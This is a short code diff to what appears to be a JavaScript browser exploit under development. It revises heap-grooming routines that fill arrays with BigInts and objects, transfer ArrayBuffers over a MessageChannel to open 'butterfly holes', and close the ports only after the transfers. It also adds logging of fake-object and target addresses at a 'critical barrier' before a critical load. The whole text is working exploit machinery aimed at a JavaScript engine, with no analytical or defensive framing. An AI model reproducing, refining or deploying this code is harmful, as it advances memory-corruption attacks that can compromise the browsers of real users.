@@ -583,13 +583,12 @@ function buildAndStoreGraph() {
     emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
     fillerGraph = new Array(0xfffd);
     let pos = 0;
-    const huge = 1n << 40n;
     for (let b = 0; b < FILLER_BIGINTS; ++b)
-        fillerGraph[pos++] = huge + BigInt(b);
+        fillerGraph[pos++] = 0x7fffffff + b;
     for (let o = 0; o < FILLER_OBJECTS; ++o)
         fillerGraph[pos++] = {};
 
-    outerGraph = new Array(CONTROL_INDEX + 1);
+    outerGraph = new Array(EXPECTED_LENGTH).fill(null);
     outerGraph[0] = fillerGraph;
     outerGraph[1] = referenceTarget;
     outerGraph[2] = referenceTarget;
@@ -946,14 +945,15 @@ function runGroomAndLoad() {
     try {
         emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
         const channel = new MessageChannel();
-        channel.port1.close();
-        channel.port2.close();
 
         for (let i = 0; i < DRAIN_COUNT; ++i)
             keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
 
         let slab = buffer(SLAB_SIZE);
         channel.port1.postMessage(0, [slab]);
+        if (slab.byteLength !== 0) {
+            emit("TRANSFER-NOOP", "slab byteLength=" + slab.byteLength);
+        }
         slab = null;
 
         const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
@@ -975,6 +975,19 @@ function runGroomAndLoad() {
 
         channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
             earlyHole, finalHole]);
+        if (butterflyHole1.byteLength !== 0 || butterflyHole2.byteLength !== 0
+            || earlyHole.byteLength !== 0 || finalHole.byteLength !== 0) {
+            emit("TRANSFER-NOOP-2",
+                "holes byteLength=" + butterflyHole1.byteLength
+                + "," + butterflyHole2.byteLength
+                + "," + earlyHole.byteLength
+                + "," + finalHole.byteLength);
+        }
+
+        // Close the ports after the transfer list has been posted.
+        channel.port1.close();
+        channel.port2.close();
+
         loadHistoryCritical();
     } catch (error) {
         try { clearPredecessor(); } catch {}
@@ -998,6 +1011,10 @@ function ensureBarrierNode() {
 }
 
 function defaultCriticalBarrier(fake, target) {
+    emit("BARRIER-FIRED", "fake=" + hex(fake)
+        + " target=" + hex(target)
+        + " t=" + (typeof performance !== "undefined"
+                   ? performance.now().toFixed(1) : "?"));
     try {
         const line = `CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
         if (barrierNode !== null) {
